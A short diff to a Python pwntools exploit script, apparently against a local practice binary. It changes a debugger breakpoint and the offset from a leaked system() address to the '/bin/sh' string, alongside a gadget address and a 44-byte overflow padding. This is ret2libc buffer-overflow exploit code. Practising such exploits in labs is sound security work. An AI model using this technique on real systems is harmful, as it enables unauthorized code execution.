@@ -5,7 +5,7 @@ context.terminal = ['tmux','splitw' ,'-h']
 
 p = process('./target')
 #p = gdb.debug('./target', '''
-#break main
+#break *main
 #break vuln
 #''')
 
@@ -15,7 +15,7 @@ system_leak = int(p.recv(10), 16)
 print 'system() system_leak: ', hex(system_leak)
 
 pop_ebx = 0x0804901e
-binsh = system_leak + 1173467
+binsh = system_leak + 1362722
 
 payload = ''
 payload += 'A' * 44
